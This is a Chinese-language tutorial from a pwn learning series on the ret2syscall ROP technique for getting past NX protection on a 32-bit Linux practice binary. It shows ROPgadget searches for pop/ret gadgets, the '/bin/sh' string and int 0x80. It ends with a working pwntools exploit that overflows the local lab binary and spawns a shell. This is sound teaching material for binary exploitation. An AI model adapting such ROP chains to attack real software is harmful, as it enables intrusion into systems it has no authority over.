14第14节.利用ROP-ret2syscall突破NX保护

发表于2026-05-28|更新于2026-05-28|逆向PWN
|浏览量:

一.问题背景

通过之前的学习我们了解到了ret2text漏洞利用依赖于程序中存在执行system(“/bin/sh”)的函数，如果没有这个函数则怎么办呢？

前面实例ret2shellcode自定义shellcode代码，这种方法的局限性是前提程序没有开启NX保护，那如果程序开启了NX保护该怎么办？

所以接下来看到我们的实例ret2syscall

二.学习新概念-什么是ROPgadget

Gedget是指在程序中的指令片段，有时候为了达到我们的执行命令的目的，需要多个Gedget来完成我们的功能。Gadget后面一般都有ret，因为要把程序控制权（ip）给下一个Gadget。

三.拼凑shellcode
eax 系统调用号
ebx 第1个参数
ecx 第2个参数
edx 第3个参数
esi 第4个参数
edi 第5个参数
int0x80

堆栈0xb ——> pop rex  ——>ret下一段

堆栈“/bin/sh”的地址 ——> pop ebx

堆栈0 ——> pop ecx

堆栈0 ——> pop edx ——> ret下一段

          int 0x80的地址

组合shellcode

系统调用号，即 eax 应该为 0xb

第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。

第二个参数，即 ecx 应该为 0

第三个参数，即 edx 应该为 0

接下来我们就要一点点的去拼凑这些内容，我们没法直接在栈里写指令，只能够利用程序中自带的指令去拼凑。

根据上面我们提到的拼凑：所以接下来我们要在程序中找一下有没有pop eax; 和pop ebx; pop ecx; pop edx; 的指令

搜索仅仅包含pop和ret的指令行，并且还要过滤出eax：ROPgadget –binary ./ret2syscall –only “pop|ret” | grep “eax”

 

选取出对我们有用的这一行，地址：0x080bb196

再搜索仅仅含有pop和ret的指令行，并且过滤出ebx ecx edx：ROPgadget –binary ./ret2syscall –only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”

 

可以看到它的顺序有点问题，等一下可以在exp中去调整：地址0x806eb90

还要搜索参数字符串“/bin/sh”：ROPgadget –binary ./ret2syscall –string “/bin/sh”

 

地址：0x080be408

还要继续搜索“int 0x80”：ROPgadget –binary ./ret2syscall –only “int”|grep “0x80”

 

地址：0x08049421

重新修改exp：

from pwn import *

context(arch = ‘i386’,os = ‘linux’)

#print “pid” + str(proc.pidof(p))

p = process(“./ret2syscall”)

offset = 112

pop_eax = p32(0x080bb196)

pop_edx_ecx_ebx = p32(0x0806eb90)

bin_sh = p32(0x80be408)

int_0x80 = p32(0x08049421)

payload = “A”*offset + pop_eax + p32(0xb) + pop_edx_ecx_ebx + p32(0) + p32(0) + bin_sh + int_0x80

#pause()   这里可以暂停 可调试

p.sendline(payload)

p.interactive()

~
